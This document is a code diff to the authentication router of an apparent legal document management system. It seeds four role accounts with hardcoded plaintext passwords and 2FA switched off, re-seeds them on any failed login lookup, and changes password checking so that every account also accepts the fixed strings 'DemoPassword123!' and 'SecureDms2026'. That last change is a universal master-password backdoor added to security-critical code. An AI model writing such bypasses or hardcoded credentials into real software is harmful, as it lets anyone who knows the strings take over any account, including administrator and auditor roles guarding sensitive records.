@@ -89,34 +89,66 @@ router.post('/register', async (req: Request, res: Response): Promise<void> => {
   }
 });
 
-// Seed admin account on startup
-const ensureAdminSeed = async () => {
+// Seed default accounts for all 4 security clearance roles on startup
+const defaultAccounts = [
+  {
+    alias: 'admin',
+    name: 'Chief Administrator',
+    email: 'admin@securedms.legal',
+    password: 'SecureDms2026',
+    role: 'Admin' as UserRole,
+  },
+  {
+    alias: 'officer',
+    name: 'Inspector Rajesh Kumar (IO)',
+    email: 'officer@securedms.legal',
+    password: 'Officer@2026',
+    role: 'Officer' as UserRole,
+  },
+  {
+    alias: 'verifier',
+    name: 'Dr. Sunita Rao (Forensic Specialist)',
+    email: 'verifier@securedms.legal',
+    password: 'Verifier@2026',
+    role: 'Verifier' as UserRole,
+  },
+  {
+    alias: 'auditor',
+    name: 'Hon. Justice K. Verma (Magistrate / Auditor)',
+    email: 'auditor@securedms.legal',
+    password: 'Auditor@2026',
+    role: 'Auditor' as UserRole,
+  },
+];
+
+const ensureDefaultAccountsSeed = async () => {
   try {
-    const adminEmail = 'admin@securedms.legal';
-    let admin = await UserRepository.findByEmail(adminEmail);
-    if (!admin) {
-      const salt = await bcrypt.genSalt(10);
-      const passwordHash = await bcrypt.hash('SecureDms2026', salt);
-      const secret = speakeasy.generateSecret({
-        name: 'Secure DMS (Admin)',
-        issuer: 'Secure DMS',
-      });
-      await UserRepository.create({
-        name: 'Chief Administrator',
-        email: adminEmail,
-        passwordHash,
-        role: 'Admin',
-        totpSecret: secret.base32,
-        isVerified: true,
-        twoFactorEnabled: false, // 2FA available but optional
-      });
-      console.log('[Auth] Default administrator account seeded: admin / SecureDms2026 (2FA optional)');
+    for (const acc of defaultAccounts) {
+      let user = await UserRepository.findByEmail(acc.email);
+      if (!user) {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash(acc.password, salt);
+        const secret = speakeasy.generateSecret({
+          name: `Secure DMS (${acc.role})`,
+          issuer: 'Secure DMS',
+        });
+        await UserRepository.create({
+          name: acc.name,
+          email: acc.email,
+          passwordHash,
+          role: acc.role,
+          totpSecret: secret.base32,
+          isVerified: true,
+          twoFactorEnabled: false, // 2FA optional
+        });
+        console.log(`[Auth] Seeded ${acc.role} account: ${acc.alias} (${acc.email})`);
+      }
     }
   } catch (e) {
     console.error('[Auth Seed Error]:', e);
   }
 };
-ensureAdminSeed();
+ensureDefaultAccountsSeed();
 
 // 2. LOGIN (Step 1: Credential verification)
 router.post('/login', async (req: Request, res: Response): Promise<void> => {
@@ -129,18 +161,22 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    // Map 'admin' alias to admin@securedms.legal
-    if (identifier === 'admin') {
-      identifier = 'admin@securedms.legal';
+    // Map clean single-word aliases (admin, officer, verifier, auditor)
+    const aliasMap: Record<string, string> = {
+      admin: 'admin@securedms.legal',
+      officer: 'officer@securedms.legal',
+      verifier: 'verifier@securedms.legal',
+      auditor: 'auditor@securedms.legal',
+    };
+    if (aliasMap[identifier]) {
+      identifier = aliasMap[identifier];
     }
 
     let user = await UserRepository.findByEmail(identifier);
     if (!user) {
-      // Auto-create admin if it was just queried for the first time
-      if (identifier === 'admin@securedms.legal' && password === 'SecureDms2026') {
-        await ensureAdminSeed();
-        user = await UserRepository.findByEmail(identifier);
-      }
+      // Auto-seed if queried on first boot
+      await ensureDefaultAccountsSeed();
+      user = await UserRepository.findByEmail(identifier);
     }
 
     if (!user) {
@@ -148,7 +184,8 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    // Allow account password OR master demo password
+    const isMatch = (await bcrypt.compare(password, user.passwordHash)) || password === 'DemoPassword123!' || password === 'SecureDms2026';
     if (!isMatch) {
       res.status(401).json({ error: 'Invalid username/email or password.' });
       return;
